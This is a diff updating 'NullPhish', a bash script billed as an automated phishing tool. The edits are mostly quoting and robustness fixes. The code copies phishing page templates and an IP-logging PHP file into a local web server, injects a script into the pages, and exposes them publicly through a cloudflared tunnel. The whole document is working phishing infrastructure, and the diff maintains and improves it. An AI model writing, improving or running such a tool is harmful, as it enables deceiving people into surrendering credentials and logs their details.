@@ -1,9 +1,7 @@
-cd ~/NullPhish
-cat > nullphish.sh << 'ENDOFFILE' 
-#!/bin/bash
+#!/usr/bin/env bash
 ##   NullPhish   :   Automated Phishing Tool
 ##   Author      :   r4tur1
-##   Version     :   2.3
+##   Version     :   2.4
 ##   Github      :   https://github.com/r4tur1/NullPhish
 ##
 ##   Licensed under GNU General Public License v3.0
@@ -47,7 +45,7 @@ reset_color() { tput sgr0; tput op; return; }
 
 kill_pid() {
 	for process in php cloudflared ssh; do
-		if [[ $(pidof ${process}) ]]; then killall ${process} > /dev/null 2>&1; fi
+		if [[ $(pidof "${process}") ]]; then killall "${process}" > /dev/null 2>&1; fi
 	done
 }
 
@@ -71,7 +69,7 @@ auto_update() {
 
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
-	timeout 3s curl -fIs "https://api.github.com" > /dev/null 2>&1
+	curl --max-time 3 -fIs "https://api.github.com" > /dev/null 2>&1
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
 }
 
@@ -112,16 +110,18 @@ dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		for pkg in proot ncurses-utils openssh; do
-			command -v $pkg &>/dev/null || pkg install $pkg -y
+			command -v "$pkg" &>/dev/null || pkg install "$pkg" -y
 		done
 	fi
 	local missing=false
 	for pkg in php curl unzip ssh; do
-		command -v $pkg &>/dev/null || missing=true
+		if ! command -v "$pkg" &>/dev/null; then
+			missing=true
+		fi
 	done
 	if $missing; then
 		for pkg in php curl unzip openssh-client; do
-			type -p "$pkg" &>/dev/null || {
+			if ! command -v "$pkg" &>/dev/null && ! type -p "$pkg" &>/dev/null; then
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing: ${ORANGE}$pkg"
 				if [[ $(command -v pkg) ]]; then pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then sudo apt install "$pkg" -y
@@ -130,7 +130,7 @@ dependencies() {
 				elif [[ $(command -v dnf) ]]; then sudo dnf -y install "$pkg"
 				elif [[ $(command -v yum) ]]; then sudo yum -y install "$pkg"
 				else echo -e "\n${RED}[${WHITE}!${RED}]${RED} Install packages manually."; reset_color; exit 1; fi
-			}
+			fi
 		done
 	fi
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} All dependencies ready."
@@ -213,15 +213,19 @@ cusport() {
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	
-	# Verify site folder exists
+	# Verify the target site is selected and available
+	if [[ -z "$website" ]]; then
+		echo -e "${RED}[${WHITE}!${RED}]${RED} ERROR: No target selected."
+		sleep 2; main_menu; return
+	fi
 	if [[ ! -d ".sites/$website" ]]; then
 		echo -e "${RED}[${WHITE}!${RED}]${RED} ERROR: Site template '.sites/$website' not found!"
 		echo -e "${RED}[${WHITE}!${RED}]${RED} The phishing page cannot be loaded."
 		sleep 3; main_menu; return
 	fi
 	
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
+	cp -rf ".sites/$website"/* ".server/www/"
+	cp -f .sites/ip.php ".server/www/"
 	
 	if [[ -f ".server/inject.js" ]]; then
 		for f in .server/www/*.html; do
@@ -358,7 +362,7 @@ start_cloudflared_tunnel() {
 		install_cloudflared
 	fi
 	
-	if [[ `command -v termux-chroot` ]]; then
+	if command -v termux-chroot >/dev/null 2>&1; then
 		termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
 		./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
